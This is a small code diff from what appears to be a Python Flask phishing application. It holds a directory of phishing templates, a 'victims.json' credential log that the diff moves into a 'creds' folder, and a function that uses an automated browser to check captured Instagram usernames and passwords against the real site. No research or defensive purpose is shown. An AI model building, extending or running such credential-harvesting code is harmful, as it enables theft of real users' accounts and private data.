@@ -9,13 +9,14 @@ import random
 
 app = Flask(__name__)
 
+# Paths
 BASE_DIR = os.getcwd()
 PHISH_DIR = os.path.join(BASE_DIR, "assets", "phish_temp")
-LOG_FILE = os.path.join(BASE_DIR, "victims.json")
+LOG_FILE = os.path.join(BASE_DIR, "creds/victims.json")
 
 def check_instagram_login(username, password):
     print(f"\n[DEBUG] Starting Authentication for: {username}")
-    
+
     with sync_playwright() as p:
         browser = p.chromium.launch(headless=False) 
         context = browser.new_context(
